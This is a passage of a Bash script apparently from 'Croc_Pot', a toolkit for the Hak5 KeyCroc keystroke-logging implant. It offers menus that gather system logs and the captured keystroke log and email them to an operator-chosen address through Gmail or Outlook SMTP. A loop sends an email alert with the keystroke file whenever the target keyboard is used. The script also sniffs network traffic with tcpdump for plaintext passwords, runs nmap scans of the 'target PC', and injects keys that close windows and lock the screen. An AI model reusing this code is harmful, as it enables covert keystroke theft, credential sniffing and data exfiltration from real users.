		ip link set dev wlan0 down ; bash /tmp/reset_net.txt &
		Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
		Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
		Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
		Q ALT-F4 ; Q GUI-l ; sleep 1 ; Q KEYCODE 00,00,2c
		exit ;;
	*)
		ip link set dev wlan0 down ; bash /tmp/reset_net.txt &
		Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
		Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
		Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
		Q ALT-F4 ; Q CONTROL-ALT-F3
		exit ;;
	esac
else
	ip link set dev wlan0 down ; bash /tmp/reset_net.txt &
	Q HOLD KEYCODE 04,00,2b,00 ; Q DELETE ; Q RELEASE
	Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER ; Q GUI-l ; Q CONTROL-ALT-F3
	exit
fi
}
##
#----KeyCroc Log mean/function save to loot/Croc_Pot
##
function croc_logs_mean() {
	echo -ne "$(Info_Screen '
-Run Keycroc Log
-Save to loot/Croc_Pot/KeyCroc_LOG.txt')\n"
	local LOOT_LOG=/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt
MenuTitle KEYCROC LOG MENU
echo -ne "\t\t" ; MenuColor 17 1 MESSAGES LOG | tr -d '\t\n' ; MenuColor 20 9 AUTH LOG | tr -d '\t'
echo -ne "\t\t" ; MenuColor 17 2 KERNEL LOG | tr -d '\t\n' ; MenuColor 19 10 DMESG LOG | tr -d '\t'
echo -ne "\t\t" ; MenuColor 17 3 SYSTEM LOG | tr -d '\t\n' ; MenuColor 19 11 BOOTSTRAP LOG | tr -d '\t'
echo -ne "\t\t" ; MenuColor 17 4 SYSSTAT LOG | tr -d '\t\n' ; MenuColor 19 12 ALTERNATIVES LOG | tr -d '\t'
echo -ne "\t\t" ; MenuColor 17 5 DEBUG LOG | tr -d '\t\n' ; MenuColor 19 13 MAIL INFO LOG | tr -d '\t'
echo -ne "\t\t" ; MenuColor 17 6 DPKG LOG | tr -d '\t\n' ; MenuColor 19 14 DAEMON LOG | tr -d '\t'
echo -ne "\t\t" ; MenuColor 17 7 NTPSTATS LOG | tr -d '\t\n' ; MenuColor 19 15 KEYSTROKES LOG | tr -d '\t'
echo -ne "\t\t" ; MenuColor 17 8 CLIENT-ERROR LOG | tr -d '\t\n' ; MenuColor 19 16 RETURN TO MAIN MENU | tr -d '\t' ; MenuEnd 23
	case $m_a in
	1) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}MESSAGES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/messages | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	2) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}KERNEL_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/kern.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	3) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}SYSTEM_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/syslog | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	4) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}SYSSTAT_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/sysstat | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	5) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DEBUG_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/debug | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	6) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DPKG_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/dpkg.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	7) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}NTPSTATS_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/ntpstats | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	8) cat /tmp/cc-client-error.log ; croc_logs_mean ;;
	9) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}AUTH_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/auth.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	10) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DMESG_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; echo -e "$(dmesg)" | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	11) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}BOOTSTRAP_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/bootstrap.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	12) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}ALTERNATIVES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/alternatives.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	13) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}MAIL_INFO_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/mail.info | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	14) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DAEMON_LOG${LINE_}\n" | tee ${LOOT_LOG} ; cat /var/log/daemon.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	15) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}KEYSTROKES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /root/udisk/loot/croc_char.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	16) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; croc_logs_mean ;;
	esac
}
##
#----Croc mail Send E-Mail with gmail or OutLook with python script
##
function croc_mail() {
	clear
	local PYTHON_MAIL=/root/udisk/tools/Croc_Pot/Croc_Mail.py
	local USER_CR=/root/udisk/tools/Croc_Pot/user_email.txt
	echo -ne "$(Info_Screen '
-Send E-Mail with gmail or OutLook with python script
-Select gmail or outlook then Enter e-mail address
-Enter e-mail password then Enter the e-mail to send to
-Add MESSAGE and/or Add Attachment
-This will create python script save to tools/Croc_Pot
-May need to adjust e-mail account settings')\n\n"
##
#----User Smtp Menu
##
user_smtp() {
MenuTitle SELECT EMAIL PROVIDER ; MenuColor 19 1 GMAIL ; MenuColor 19 2 OUTLOOK ; MenuColor 19 3 RETURN TO MAIN MENU ; MenuEnd 22
	case $m_a in
	1) local GMAIL=smtp.gmail.com ; echo ${GMAIL} >> ${USER_CR} ;; 2) local OUTLOOK=smtp-mail.outlook.com ; echo ${OUTLOOK} >> ${USER_CR} ;; 3) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; user_smtp ;;
	esac
}
##
#----User E-mail input credentials
##
user_email_set() {
	read_all ENTER E-MAIL ADDRESS AND PRESS [ENTER] ; echo ${r_a} >> ${USER_CR}
	user_input_passwd ${USER_CR} E_MAIL
	read_all ENTER E-MAIL TO SEND LOOT TO AND PRESS [ENTER] ; echo ${r_a} >> ${USER_CR}
}
##
#----Python variables to change between files when file is created
##
python_v() {
	FILE_A_B="file_location_${CHANGE_FILE} ="
	FILE_B_B="filename_${CHANGE_FILE} = os.path.basename(file_location_${CHANGE_FILE})"
	FILE_C_B="attachment_${CHANGE_FILE} = open(file_location_${CHANGE_FILE}, 'rb')"
	FILE_D_B="part_${CHANGE_FILE} = MIMEBase('application', 'octet-stream')"
	FILE_E_B="part_${CHANGE_FILE}.set_payload(attachment_${CHANGE_FILE}.read())"
	FILE_F_B="encoders.encode_base64(part_${CHANGE_FILE})"
	FILE_G_B="part_${CHANGE_FILE}.add_header('Content-Disposition', \"attachment; filename= %s\" % filename_${CHANGE_FILE})"
	FILE_H_B="msg.attach(part_${CHANGE_FILE})"
	FILE_I_B="${CHANGE_FILE_A}"
}
mail_file() {
	clear
##
#----Mail User selected file add to python_v variables
##
send_all_file() {
if [ -e "${1}" ]; then
	local CHANGE_FILE="${2}"
	local CHANGE_FILE_A="'${1}'"
	python_v
	echo -ne "$(ColorGreen 'THIS FILE') ${1} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})"
else
	echo -ne "\n${LINE_}\e[40;31;4;5mPLEASE RUN ${@:3:4} FIRST STARTING ${@:3:4}${clear}${LINE_}\n"
	${5}
fi
}
##
#----Mail user enter path to Attachment Function
##
send_file_e() {
	cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo -ne "${yellow}Directory: ${clear}${cyan}${i} ${clear}${yellow}Contains: ${clear}${green}${g} ${clear}${yellow}files.${clear}\n"; done 2> /dev/null
	read_all ENTER THE DIRECTORY NAME TO VEIW FILES AND PRESS [ENTER] ; local r_f=${r_a}
	f=`find /${r_f} -type f -name "*"` ; echo -ne "${green}${f}${clear}\n"
	read_all ENTER THE PATH TO ATTACHMENT AND PRESS [ENTER] ; s_a=${r_a}
if [ -e "${s_a}" ]; then
	local CHANGE_FILE="P"
	local CHANGE_FILE_A="'${s_a}'"
	python_v
	echo -ne "\n$(ColorGreen 'THIS FILE') ${s_a} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})\n"
else
	echo -ne "\n${LINE_}\e[4;5m$(ColorRed 'FILE DOES NOT EXIST PLEASE TRY AGAIN')${clear}${LINE_}\n"
fi
}
##
#----Mail send saved keystrokes file Function
##
send_file_f() {
	local KEY_ST=/root/udisk/loot/croc_char.log
if [ -e "${KEY_ST}" ]; then
	local CHANGE_FILE="F"
	local CHANGE_FILE_A="'/root/udisk/loot/croc_char.log'"
	python_v
	echo -ne "$(ColorGreen 'THIS FILE') ${KEY_ST} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})"
else
	echo -ne "\n${LINE_}\e[4;5m$(ColorRed 'DID NOT FIND croc_char.log')${clear}${LINE_}\n"
fi
}
##
#----Croc Mail Select File to send Menu
##
MenuTitle SELECT FILE TO E-MAIL ; MenuColor 19 1 NMAP SCAN ; MenuColor 19 2 KEYCROC LOG ; MenuColor 19 3 WINDOW SCAN ; MenuColor 19 4 KEYCROC INFO
MenuColor 19 5 ADD ATTACHMENT ; MenuColor 19 6 KEYSTROKES LOG ; MenuColor 19 7 RETURN TO MAIN MENU ; MenuEnd 22
	case $m_a in
	1) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt B NMAP SCAN nmap_menu ;; 2) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt C KEYCROC LOG croc_logs_mean ;; 3) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt D WINDOWS SCAN croc_pot_plus ;;
	4) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt E KEYCROC STATUS croc_status ;; 5) send_file_e ;; 6) send_file_f ;; 7) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; *) invalid_entry ; mail_file ;;
	esac
}
##
#----Create Python E-mail file with python_v variables
##
python_email() {
	echo -ne "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n
from email.mime.base import MIMEBase\nfrom email import encoders\nimport os.path\n\nemail = '$(sed -n 2p ${USER_CR})'\npassword = '$(sed -n 3p ${USER_CR})'\nsend_to_email = '$(sed -n 4p ${USER_CR})'\n
subject = 'CROC_MAIL'\nmessage = '${MY_MESS_A}'\n${FILE_A_B} ${FILE_I_B}\n
msg = MIMEMultipart()\nmsg['From'] = email\nmsg['To'] = send_to_email\nmsg['Subject'] = subject\nmsg.attach(MIMEText(message, 'plain'))\n
${FILE_B_B}\n${FILE_C_B}\n${FILE_D_B}\n${FILE_E_B}\n${FILE_F_B}\n${FILE_G_B}\n
${FILE_H_B}\nserver = smtplib.SMTP('$(sed -n 1p ${USER_CR})', 587)\nserver.starttls()\nserver.login(email, password)\n
text = msg.as_string()\nserver.sendmail(email, send_to_email, text)\nserver.quit()" > ${PYTHON_MAIL}
	python ${PYTHON_MAIL}
}
##
#----Mail check for existing email
##
if [ -e "${USER_CR}" ]; then
	echo -ne "${yellow}PERSONAL E-MAIL: ${clear}${green}$(sed -n 2p ${USER_CR})${clear}\n${yellow}RECEIVING E-MAIL: ${clear}${green}$(sed -n 4p ${USER_CR})${clear}\n\n"
##
#----Mail check existing email for new messages gmail only
##
local check_gmail="$(sed -n 1p /root/udisk/tools/Croc_Pot/user_email.txt)"
	if [[ "${check_gmail}" == "smtp.gmail.com" ]]; then
	read_all CHECK E-MAIL FOR NEW MESSAGES Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		local USER="$(sed -n 2p /root/udisk/tools/Croc_Pot/user_email.txt)"
		local PASS="$(sed -n 3p /root/udisk/tools/Croc_Pot/user_email.txt)"
		local check_inbox=`echo wget -T 3 -t 1 -q --secure-protocol=TLSv1 --no-check-certificate \ --user=$USER --password=$PASS https://mail.google.com/mail/feed/atom -O -`
		${check_inbox} | while IFS=\> read -d \< E C; do
		if [[ $E = "fullcount" ]]; then
			if [[ $C == 0 ]]; then
				echo -ne "\n${yellow}No New Messages...${clear}\n"
				break
			else
				echo -ne "\n${yellow}New Messages: ${clear}${green}$C${clear}\n"
				echo -ne "${LINE}\n"
			fi
		fi
			if [[ $E = "title" ]]; then
				echo -ne "\n${LINE}\n$C"
			fi
			if [[ $E = "issued" ]]; then
				echo "	$C"
			fi
			if [[ $E = "summary" ]]; then
				echo "$C [...]"
			fi
			if [[ $E = "name" ]]; then
				echo "	$C"
			fi
			if [[ $E = "email" ]]; then
				echo "	$C"
			fi
		done ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; croc_mail ;;
	esac
	fi
##
#----Mail keep/remove existing e-mail
##
read_all USE EXISTING E-MAIL CREDENTIALS Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		echo -ne "\n${LINE_}$(ColorGreen 'KEEPING EXISTING E-MAIL CREDENTIALS')${LINE_}\n\n" ;;
	[nN] | [nN][oO])
		rm ${USER_CR}
		user_smtp
		user_email_set ;;
	*)
		invalid_entry ; croc_mail ;;
	esac
else
	echo -ne "\n\e[5m$(ColorRed 'NO EXISTING E-MAIL CREDENTIALS WERE FOUND PLEASE ENTER E-MAIL CREDENTIALS')\n\n"
	user_smtp
	user_email_set
fi
##
#----Mail add personal message to email
##
read_all ENTER A PERSONAL MESSAGE Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	unset MY_MESS_A
	read_all ENTER MESSAGE AND PRESS [ENTER] ; MY_MESS_A=${r_a} ;;
[nN] | [nN][oO])
	unset MY_MESS_A
	local MY_MESS_A=$(perl -e 'print "Croc_Mail---Author: SPYWILL---KEYCROC-HAK5"') ;;
*)
	invalid_entry ; croc_mail ;;
esac
##
#----Mail add attachment to email
##
	read_all ADD ATTACHMENT Y/N AND PRESS [ENTER] ; a_f=${r_a}
case $a_f in
[yY] | [yY][eE][sS])
	mail_file ;;
[nN] | [nN][oO])
	unset FILE_A_B FILE_B_B FILE_C_B FILE_D_B FILE_E_B FILE_F_B FILE_G_B FILE_H_B FILE_I_B
	echo -ne "\n$(ColorGreen 'SENDING E-MAIL')\n" ;;
*)
	invalid_entry ; mail_file ;;
esac
python_email & displaySpinner Please wait... && echo -ne "\n\n"
##
#----Mail send e-mail alert when keyboard is activated/activaty
##
	echo -ne "$(Info_Screen '
-Any keyboard activaty will send a E-mail alert and one file
-Run Continuously in loop PRESS CTRL + C to break loop in terminal
-Send live keystroke with [/tmp/livekey.txt]
installed Live_Keystroke.txt payload first
-default file will be [/root/udisk/loot/croc_char.log]')\n\n"
read_all SEND E-MAIL ALERT Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	unset MY_MESS_A
	local i=1
	reset_broken
	if [ -e "/tmp/livekey.txt" ]; then
		local CHANGE_FILE="F"
		local CHANGE_FILE_A="'/tmp/livekey.txt'"
	elif [ -e "/root/udisk/loot/croc_char.log" ]; then
		local CHANGE_FILE="F"
		local CHANGE_FILE_A="'/root/udisk/loot/croc_char.log'"
	fi
	echo -ne "${yellow}Sending ${CHANGE_FILE_A}${clear}\n" ; sleep 2
	while WAIT_FOR_KEYBOARD_ACTIVITY 0 ; do
		$((i++)) 2> /dev/null
		if [ $broken -eq 1 ]; then
			break ; main_menu
		else
			local MY_MESS_A=$(echo -ne "Target keyboard has been activated $(date +%b-%d-%y-%r) COUNT: ${i}")
			python_v
			python_email & displaySpinner KEYBOARD HAS BEEN ACTIVATED SENDING E-MAIL Please wait...
			sleep 10
		fi
	done &
	while WAIT_FOR_KEYBOARD_INACTIVITY 2 ; do
		local temp=${spinstr#?}
		if [ $broken -eq 1 ]; then
			break ; main_menu
		else
			echo -ne "\e[40;3$(( $RANDOM * 6 / 32767 +1 ))m$(printf " [%c] " "$spinstr")${clear}${yellow}KEYBOARD: ${clear}${cyan}INACTIVITE ${clear}${yellow}COUNT: ${clear}${green}$((i++))${clear}\033[0K\r"
			local spinstr=$temp${spinstr%"$temp"}
		fi
	done
	trap - SIGINT ; main_menu ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ; main_menu ;;
*)
	invalid_entry ; croc_mail ;;
esac
}
##
#----Croc pot plus menu/function
##
function croc_pot_plus() {
##
#----Recon scan menu/Function
##
function croc_recon() {
	echo -ne "$(Info_Screen '
-Perform some basic recon scan')\n"
##
#----Recon Tcpdump Menu/Function
##
tcpdump_scan() {
	local LOOT_TCPDUMP=/root/udisk/loot/Croc_Pot/tcpdump.txt
	echo -ne "$(Info_Screen '
-Start some basic Tcpdump scan and save to Loot/Croc_Pot folder
-PRESS CTRL + C TO STOP TCPDUMP SCAN')\n"
MenuTitle TCPDUMP SCAN MENU ; MenuColor 25 1 INTERFACE SCAN ; MenuColor 25 2 PACKETS IN HEX AND ASCll ; MenuColor 25 3 PACKETS WITH IP ADDRESS ; MenuColor 25 4 CURRENT NETWORK INTERFACE
MenuColor 25 5 CHECK HOST COMMUNICATION ; MenuColor 25 6 TCP PACKET HTTP REQUEST ; MenuColor 25 7 PACKET OF TCP,UDP,ICMP ; MenuColor 25 8 HOST HEADER HTTP ; MenuColor 25 9 DNS QUERY REQUEST
MenuColor 24 10 ENTER AN TCPDUMP SCAN ; MenuColor 24 11 RETURN TO MAIN MENU ; MenuEnd 28
	case $m_a in
	1) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}INTERFACE SCAN${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump -D | tee -a ${LOOT_TCPDUMP} ; tcpdump_scan ;;
	2) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}PACKETS IN HEX AND ASCll${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump -XX -i any | tee -a ${LOOT_TCPDUMP} ; tcpdump_scan ;;
	3) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}PACKETS WITH IP ADDRESS${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump -n -i any >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
	4) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}CURRENT NETWORK INTERFACE${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
	5) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}CHECK HOST COMMUNICATION${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; read_all ENTER IP AND PRESS [ENTER] && tcpdump -i any src host ${r_a} >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
	6) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}TCP PACKET HTTP REQUEST${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump -i any port http >> ${LOOT_TCPDUMP} & tcpdump -i any port 80 >> ${LOOT_TCPDUMP} & tcpdump -A -s 1492 dst port 80 or -A -s 1492 src port 80 >> ${LOOT_TCPDUMP} & tcpdump -i any port http or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|userna me:|password:|login:|pass |user ' >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
	7) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}PACKET OF TCP,UDP,ICMP${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump -n -v tcp or udp or icmp and not port 22 >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
	8) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}HOST HEADER HTTP${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump -i any -n -s 0 -w - | grep -a -o -E --line-buffered "GET \/.*|Host\: .*" >> ${LOOT_TCPDUMP} & tail -f ${LOOT_TCPDUMP} && tcpdump_scan ;;
	9) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}DNS QUERY REQUEST${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump -i any 'udp port 53' >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
	10) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}TCPDUMP SCAN${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; read_all ENTER TCPDUMP SCAN THEN AND PRESS [ENTER] && ${r_a} >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
	11) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) croc_recon ;; *) invalid_entry ; tcpdump_scan ;;
	esac
}
##
#----Recon Nmap mean/Function
##
nmap_menu() {
	echo -ne "$(Info_Screen '
-Start some basic nmap scan and save to Loot/Croc_Pot folder
-Enter IP for scan or default will be target pc ip')\n"
	local LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
##
#----Nmap User enter IP for scan (default target pc) 
##
user_ip_f() {
read_all ENTER IP TO USE FOR NMAP SCAN AND PRESS [ENTER]
if [[ "${r_a}" =~ ${validate_ip} ]]; then
	IP_SETUP=${r_a}
	echo -ne "\t${LINE_}$(ColorGreen 'USING IP THAT WAS ENTER')${r_a}\n"
else
	echo -ne "\t$(ColorRed 'USING TARGET PC IP')$(os_ip)\n"
	IP_SETUP=$(os_ip)
fi
}
##
#----Regular nmap scan on Target Pc
##
pc_scan() {
if [ "$(OS_CHECK)" = WINDOWS ]; then
	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}TARGET PC SCAN: $(OS_CHECK)${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(os_ip) | tee -a ${LOOT_NMAP} & displaySpinner Nmap scan in progress Please wait...
elif [ "$(OS_CHECK)" = LINUX ]; then
	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}TARGET PC SCAN: $(OS_CHECK)${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(os_ip) | tee -a ${LOOT_NMAP} & displaySpinner Nmap scan in progress Please wait...
else
	echo -ne "\n\t$(ColorRed 'PLEASE RUN CROC_POT_PAYLOAD.txt TO GET TARGET PC USER NAME AND IP')\n"
fi
}
##
#----Nmap Scan Menu/nmap scan
##
LED B
MenuTitle NMAP MENU ; MenuColor 20 1 REGULAR SCAN ; MenuColor 20 2 QUICK SCAN ; MenuColor 20 3 QUICK PLUS ; MenuColor 20 4 PING SCAN ; MenuColor 20 5 INTENSE SCAN
MenuColor 20 6 INTERFACE SCAN ; MenuColor 20 7 PORT SCAN ; MenuColor 20 8 PERSONAL SCAN ; MenuColor 20 9 TARGET PC SCAN ; MenuColor 19 10 RETURN TO MAIN MENU ; MenuEnd 23
	case $m_a in
	1) user_ip_f ; croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP REGULAR SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap ${IP_SETUP} | tee -a ${LOOT_NMAP} & displaySpinner Nmap scan in progress Please wait... ; nmap_menu ;;
	2) user_ip_f ; croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP QUICK SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -T4 -F ${IP_SETUP} | tee -a ${LOOT_NMAP} & displaySpinner Nmap scan in progress Please wait... ; nmap_menu ;;
	3) user_ip_f ; croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP QUICK_PLUS SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -sV -T4 -O -F --version-light ${IP_SETUP} | tee -a ${LOOT_NMAP} & displaySpinner Nmap scan in progress Please wait... ; nmap_menu ;;
	4) user_ip_f ; croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PING SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -sn ${IP_SETUP} | tee -a ${LOOT_NMAP} & displaySpinner Nmap scan in progress Please wait... ; nmap_menu ;;
	5) user_ip_f ; croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP INTENSE SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -T4 -A -v ${IP_SETUP} | tee -a ${LOOT_NMAP} & displaySpinner Nmap scan in progress Please wait... ; nmap_menu ;;
	6) croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP INTERFACE SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap --iflist | tee -a ${LOOT_NMAP} & displaySpinner Nmap scan in progress Please wait... ; nmap_menu ;;
	7) user_ip_f ; croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PORT SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap --top-ports 20 ${IP_SETUP} | tee -a ${LOOT_NMAP} & displaySpinner Nmap scan in progress Please wait... ; nmap_menu ;;
	8) croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PERSONAL SCAN${LINE_}\n" ; read_all ENTER PERSONAL NMAP SCAN SETTINGS AND PRESS [ENTER] && ${r_a} | tee -a ${LOOT_NMAP} & displaySpinner Nmap scan in progress Please wait... ; nmap_menu ;;
	9) pc_scan ; nmap_menu ;; 10) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) croc_recon ;; *) invalid_entry ; nmap_menu ;;
	esac
}
##
#----Recon, Function to start the recon scans
##
scan_all() {
	read_all START RECON SCAN Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	read_all ENTER IP OR WEB SITE NAME AND PRESS [ENTER]
	${@:2} ${r_a} & displaySpinner Scan in progress Please wait... ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n"
	croc_recon ;;
*)
	invalid_entry ; ${1} ;;
esac
}
##
#----Recon Traceroute scan
##
traceroute_scan() {
	clear
	echo -ne "$(Info_Screen '
-Traceroute scan enter IP or web site name')\n\n"
	scan_all traceroute_scan traceroute
}
##
#----Recon Whois lookup scan
##
whois_scan() {
	clear
	echo -ne "$(Info_Screen '
-Whois Lookup scan enter IP or web site name
-Requirements: WHOIS')\n\n"
	install_package whois WHOIS whois_scan croc_recon
	scan_all whois_scan whois -H
}
##
#----Recon DNS lookup scan
##
dns_scan() {
	clear
	echo -ne "$(Info_Screen '
-DNS Lookup scan enter IP or web site name
-Requirements: DNSUTILS')\n\n"
	install_package dnsutils DNSUTILS dns_scan croc_recon
	scan_all dns_scan dig
}
##
#----Recon Ping scan
##
target_ping() {
	clear
	unset -f ping_alert && killall tcpdump 2> /dev/null
	echo -ne "$(Info_Screen '
-Ping scan enter IP or web site name')\n\n"
	scan_all target_ping ping -q -c 5 -w 5
}
##
#----Recon Port scan with Netcat enter port range
##
target_port() {
	clear
	echo -ne "$(Info_Screen '
-Port scan with Netcat enter IP or web site name
-Port range will start at port 1 enter port range to stop
-Click Ctrl+C to stop script')\n\n"
	read_all START PORT SCAN Y/N AND PRESS [ENTER]
case $r_a in
